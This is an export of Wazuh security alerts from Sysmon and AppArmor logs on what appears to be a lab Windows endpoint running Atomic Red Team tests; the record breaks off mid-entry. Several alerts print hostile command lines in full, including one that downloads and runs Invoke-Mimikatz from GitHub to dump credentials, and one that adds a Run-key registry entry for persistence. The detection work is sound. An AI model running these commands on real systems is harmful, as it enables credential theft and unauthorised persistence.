2025-12-29T10:24:44.958Z,Endpoint3-Win,1,92058,Application Compatibility Database launched,12,T1546.011,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'sdbinst.exe', 'image': 'C:\\\\Windows\\\\System32\\\\sdbinst.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-287e-6951-f500-000000001000}', 'description': 'Application Compatibility Database Installer', 'logonGuid': '{411eefe4-27dd-6951-e703-000000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc', 'processGuid': '{411eefe4-56ea-6952-6018-000000001000}', 'logonId': '0x3e7', 'parentProcessId': '5480', 'processId': '14080', 'currentDirectory': 'C:\\\\WINDOWS\\\\system32\\\\', 'utcTime': '2025-12-29 10:24:42.907', 'hashes': 'SHA1=4CEB1885F9361E20F7C773A86C857C03FFA5437C,MD5=DC70AD1DC4FE326D5ADDFFC6EC193900,SHA256=F98BB76EEAE67C5E88FBC6E9564F4471505EEEF0723DBF9A5DC89F6B5779B5F1,IMPHASH=1B6EE3C1899EA90A8A3811555E1DA64E', 'parentImage': 'C:\\\\Windows\\\\System32\\\\svchost.exe', 'ruleName': 'technique_id=T1546.011,technique_name=Application Shimming', 'company': 'Microsoft Corporation', 'commandLine': 'C:\\\\WINDOWS\\\\System32\\\\sdbinst.exe -m -bg', 'integrityLevel': 'System', 'fileVersion': '10.0.26100.7309 (WinBuild.160101.0800)', 'user': 'NT AUTHORITY\\\\SYSTEM', 'terminalSessionId': '0', 'parentUser': 'NT AUTHORITY\\\\SYSTEM'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1546.011,technique_name=Application Shimming\r\nUtcTime: 2025-12-29 10:24:42.907\r\nProcessGuid: {411eefe4-56ea-6952-6018-000000001000}\r\nProcessId: 14080\r\nImage: C:\\Windows\\System32\\sdbinst.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Application Compatibility Database Installer\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sdbinst.exe\r\nCommandLine: C:\\WINDOWS\\System32\\sdbinst.exe -m -bg\r\nCurrentDirectory: C:\\WINDOWS\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {411eefe4-27dd-6951-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=4CEB1885F9361E20F7C773A86C857C03FFA5437C,MD5=DC70AD1DC4FE326D5ADDFFC6EC193900,SHA256=F98BB76EEAE67C5E88FBC6E9564F4471505EEEF0723DBF9A5DC89F6B5779B5F1,IMPHASH=1B6EE3C1899EA90A8A3811555E1DA64E\r\nParentProcessGuid: {411eefe4-287e-6951-f500-000000001000}\r\nParentProcessId: 5480\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc\r\nParentUser: NT AUTHORITY\\SYSTEM""', 'version': '5', 'systemTime': '2025-12-29T10:24:42.9320937Z', 'eventRecordID': '18465', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 12, 'description': 'Application Compatibility Database launched', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Application Shimming'], 'id': ['T1546.011'], 'tactic': ['Privilege Escalation', 'Persistence']}, 'id': '92058'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:24:44.958Z', 'location': 'EventChannel', 'id': '1767003884.7315119', 'timestamp': '2025-12-29T11:24:44.958+0100'}",critical,C:\\WINDOWS\\System32\\sdbinst.exe -m -bg
2025-12-29T10:26:30.084Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:28.744859+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 101, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:28.744859+01:00 wazuh-vm kernel: audit: type=1400 audit(1767003988.743:277): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:30.084Z', 'location': '/var/log/syslog', 'id': '1767003990.7321442', 'timestamp': '2025-12-29T11:26:30.084+0100'}",low,
2025-12-29T10:26:30.085Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:28.744859+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 102, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:28.744859+01:00 wazuh-vm kernel: audit: type=1400 audit(1767003988.743:277): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:30.085Z', 'location': '/var/log/kern.log', 'id': '1767003990.7321871', 'timestamp': '2025-12-29T11:26:30.085+0100'}",low,
2025-12-29T10:26:34.094Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:33.780126+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 104, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:33.780126+01:00 wazuh-vm kernel: audit: type=1400 audit(1767003993.778:278): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:34.094Z', 'location': '/var/log/kern.log', 'id': '1767003994.7322731', 'timestamp': '2025-12-29T11:26:34.094+0100'}",low,
2025-12-29T10:26:34.094Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:33.780126+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 103, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:33.780126+01:00 wazuh-vm kernel: audit: type=1400 audit(1767003993.778:278): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:34.094Z', 'location': '/var/log/syslog', 'id': '1767003994.7322302', 'timestamp': '2025-12-29T11:26:34.094+0100'}",low,
2025-12-29T10:26:40.097Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:38.863898+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 105, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:38.863898+01:00 wazuh-vm kernel: audit: type=1400 audit(1767003998.862:279): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:40.097Z', 'location': '/var/log/syslog', 'id': '1767004000.7323162', 'timestamp': '2025-12-29T11:26:40.097+0100'}",low,
2025-12-29T10:26:40.097Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:38.863898+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 106, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:38.863898+01:00 wazuh-vm kernel: audit: type=1400 audit(1767003998.862:279): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:40.097Z', 'location': '/var/log/kern.log', 'id': '1767004000.7323591', 'timestamp': '2025-12-29T11:26:40.097+0100'}",low,
2025-12-29T10:26:44.104Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:43.873980+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 107, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:43.873980+01:00 wazuh-vm kernel: audit: type=1400 audit(1767004003.870:280): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:44.104Z', 'location': '/var/log/syslog', 'id': '1767004004.7324022', 'timestamp': '2025-12-29T11:26:44.104+0100'}",low,
2025-12-29T10:26:44.139Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:43.873980+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 108, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:43.873980+01:00 wazuh-vm kernel: audit: type=1400 audit(1767004003.870:280): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:44.139Z', 'location': '/var/log/kern.log', 'id': '1767004004.7324451', 'timestamp': '2025-12-29T11:26:44.139+0100'}",low,
2025-12-29T10:26:56.117Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:55.776744+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 109, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:55.776744+01:00 wazuh-vm kernel: audit: type=1400 audit(1767004015.775:281): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:56.117Z', 'location': '/var/log/syslog', 'id': '1767004016.7324882', 'timestamp': '2025-12-29T11:26:56.117+0100'}",low,
2025-12-29T10:26:56.118Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-29T11:26:55.776744+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 110, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-29T11:26:55.776744+01:00 wazuh-vm kernel: audit: type=1400 audit(1767004015.775:281): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=5825 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:26:56.118Z', 'location': '/var/log/kern.log', 'id': '1767004016.7325311', 'timestamp': '2025-12-29T11:26:56.118+0100'}",low,
2025-12-29T10:27:02.287Z,Endpoint3-Win,1,92052,Windows command prompt started by an abnormal process,4,T1059.003,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'Cmd.Exe', 'image': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-ab3e-6951-cb0d-000000001000}', 'description': 'Windows Command Processor', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-5774-6952-6b18-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5948', 'processId': '8284', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:27:00.238', 'hashes': 'SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1059.003,technique_name=Windows Command Shell', 'company': 'Microsoft Corporation', 'commandLine': '\\""cmd.exe\\"" /c powershell.exe \\""IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.7309 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2025-12-29 10:27:00.238\r\nProcessGuid: {411eefe4-5774-6952-6b18-000000001000}\r\nProcessId: 8284\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: ""cmd.exe"" /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds""\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {411eefe4-ab3e-6951-cb0d-000000001000}\r\nParentProcessId: 5948\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:27:00.2895917Z', 'eventRecordID': '18502', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': False, 'level': 4, 'description': 'Windows command prompt started by an abnormal process', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Windows Command Shell'], 'id': ['T1059.003'], 'tactic': ['Execution']}, 'id': '92052'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:02.287Z', 'location': 'EventChannel', 'id': '1767004022.7325742', 'timestamp': '2025-12-29T11:27:02.287+0100'}",medium,"\""cmd.exe\"" /c powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"""
2025-12-29T10:27:05.552Z,Endpoint3-Win,1,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-5774-6952-6d18-000000001000}', 'processId': '14132', 'utcTime': '2025-12-29 10:27:03.497', 'targetFilename': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_0nhb33rs.ksd.ps1', 'ruleName': 'technique_id=T1059.001,technique_name=PowerShell', 'creationUtcTime': '2025-12-29 10:27:03.495', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '11', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-12-29 10:27:03.497\r\nProcessGuid: {411eefe4-5774-6952-6d18-000000001000}\r\nProcessId: 14132\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\ayoub\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0nhb33rs.ksd.ps1\r\nCreationUtcTime: 2025-12-29 10:27:03.495\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:27:03.5249809Z', 'eventRecordID': '18512', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '11', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 15, 'description': 'Executable file dropped in folder commonly used by malware', 'groups': ['sysmon', 'sysmon_eid11_detections', 'windows'], 'mitre': {'technique': ['Ingress Tool Transfer'], 'id': ['T1105'], 'tactic': ['Command and Control']}, 'id': '92213'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:05.552Z', 'location': 'EventChannel', 'id': '1767004025.7332916', 'timestamp': '2025-12-29T11:27:05.552+0100'}",critical,
2025-12-29T10:27:34.062Z,Endpoint3-Win,1,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-5792-6952-7218-000000001000}', 'processId': '14180', 'utcTime': '2025-12-29 10:27:31.990', 'targetFilename': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_sar3i0b0.im4.ps1', 'ruleName': 'technique_id=T1059.001,technique_name=PowerShell', 'creationUtcTime': '2025-12-29 10:27:31.990', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '11', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-12-29 10:27:31.990\r\nProcessGuid: {411eefe4-5792-6952-7218-000000001000}\r\nProcessId: 14180\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\ayoub\\AppData\\Local\\Temp\\__PSScriptPolicyTest_sar3i0b0.im4.ps1\r\nCreationUtcTime: 2025-12-29 10:27:31.990\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:27:32.0154309Z', 'eventRecordID': '18542', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '11', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 2, 'mail': True, 'level': 15, 'description': 'Executable file dropped in folder commonly used by malware', 'groups': ['sysmon', 'sysmon_eid11_detections', 'windows'], 'mitre': {'technique': ['Ingress Tool Transfer'], 'id': ['T1105'], 'tactic': ['Command and Control']}, 'id': '92213'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:34.062Z', 'location': 'EventChannel', 'id': '1767004054.7335999', 'timestamp': '2025-12-29T11:27:34.062+0100'}",critical,
2025-12-29T10:27:39.931Z,Endpoint3-Win,1,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-5799-6952-7818-000000001000}', 'processId': '10664', 'utcTime': '2025-12-29 10:27:38.082', 'targetFilename': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_be0hqbok.tou.ps1', 'ruleName': 'technique_id=T1059.001,technique_name=PowerShell', 'creationUtcTime': '2025-12-29 10:27:38.077', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '11', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-12-29 10:27:38.082\r\nProcessGuid: {411eefe4-5799-6952-7818-000000001000}\r\nProcessId: 10664\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\ayoub\\AppData\\Local\\Temp\\__PSScriptPolicyTest_be0hqbok.tou.ps1\r\nCreationUtcTime: 2025-12-29 10:27:38.077\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:27:38.0903716Z', 'eventRecordID': '18570', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '11', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 3, 'mail': True, 'level': 15, 'description': 'Executable file dropped in folder commonly used by malware', 'groups': ['sysmon', 'sysmon_eid11_detections', 'windows'], 'mitre': {'technique': ['Ingress Tool Transfer'], 'id': ['T1105'], 'tactic': ['Command and Control']}, 'id': '92213'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:39.931Z', 'location': 'EventChannel', 'id': '1767004059.7339082', 'timestamp': '2025-12-29T11:27:39.931+0100'}",critical,
2025-12-29T10:27:58.748Z,Endpoint3-Win,1,92052,Windows command prompt started by an abnormal process,4,T1059.003,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'Cmd.Exe', 'image': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-ab3e-6951-cb0d-000000001000}', 'description': 'Windows Command Processor', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-57ad-6952-7e18-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5948', 'processId': '11192', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:27:57.604', 'hashes': 'SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1059.003,technique_name=Windows Command Shell', 'company': 'Microsoft Corporation', 'commandLine': '\\""cmd.exe\\"" /c REG ADD \\""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\"" /V \\""Atomic Red Team\\"" /t REG_SZ /F /D \\""C:\\\\Path\\\\AtomicRedTeam.exe\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.7309 